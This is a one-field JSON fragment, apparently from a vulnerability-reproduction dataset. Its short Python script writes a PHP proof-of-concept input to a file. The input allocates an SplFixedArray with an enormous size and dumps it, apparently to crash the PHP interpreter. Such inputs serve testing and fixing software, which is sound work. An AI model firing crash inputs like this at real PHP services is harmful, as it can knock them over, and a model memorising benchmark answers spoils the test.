    "decoding": "<pov_script>\n\n# Use embedded PoC data\npoc_data = b'<?$a=new SplFixedArray(010001000);$b=$a;$c=$b;var_dump($c);'\n\nwith open(\"input.bin\", \"wb\") as f:\n    f.write(poc_data)\n\n</pov_script>\n",
